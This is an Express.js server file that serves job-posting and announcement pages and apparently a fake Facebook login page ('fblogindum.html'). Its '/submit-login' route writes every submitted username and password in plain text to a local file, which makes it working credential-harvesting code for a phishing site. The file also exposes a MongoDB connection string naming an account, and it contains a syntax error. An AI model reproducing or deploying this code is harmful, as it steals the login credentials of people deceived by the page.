const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000; // Use Render's PORT environment variable

const { MongoClient } = require('mongodb');

const uri = "mongodb+srv://garycantilang:<db_password>@cluster0.cygdj.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0";"; // Replace with your connection string
const client = new MongoClient(uri, { useNewUrlParser: true, useUnifiedTopology: true });

async function connectToDatabase() {
    try {
      await client.connect();
      console.log("Connected to MongoDB");
      // Access your database with client.db('<database_name>')
    } catch (error) {
      console.error("MongoDB connection error:", error);
    }
  }
  
  connectToDatabase();

// Middleware to parse form data
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname)); // Serve static files from the "public" directory

// Route to handle login form submission
app.post('/submit-login', (req, res) => {
    const { username, password } = req.body;
    const data = `Username: ${username}, Password: ${password}\n`; // Format the data to save

    // Append data to a text file
    fs.appendFile(path.join(__dirname, 'login_data.txt'), data, (err) => {
        if (err) {
            console.error('Error writing to file', err);
            return res.status(500).send('Error saving data.');
        }
        res.send('Login information saved successfully.');
    });
});

// Route to serve the homepage
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'Home.html')); // Change 'index.html' to your main HTML file name
});

app.get('/Job Postings.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'Job Postings.html')); // Change 'index.html' to your main HTML file name
});
app.get('/Announcements.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'Announcements.html')); // Change 'index.html' to your main HTML file name
});
app.get('/public/fblogindum.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'fblogindum.html')); // Change 'index.html' to your main HTML file name
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
